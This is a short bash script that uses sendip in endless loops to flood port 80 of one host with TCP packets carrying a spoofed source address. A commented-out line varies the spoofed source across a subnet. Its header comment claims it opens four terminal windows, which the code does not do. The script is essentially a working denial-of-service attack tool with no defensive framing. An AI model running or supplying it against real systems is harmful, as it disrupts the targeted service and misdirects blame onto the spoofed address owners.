#!/bin/bash
# This script opens 4 terminal windows.
i="0"
j="20"
while true
do
#while [[ ${i} -lt 254 ]]
#do
while [[ ${j} -lt 99999 ]]
do
# sendip -p ipv4 -p tcp -td 80 -ts ${j} -is $1.${i} 200.1.1.7
sendip -p ipv4 -p tcp -td 80 -ts ${j} -is 195.11.14.29 200.1.1.7
i=$[$i+1]
#done
done
done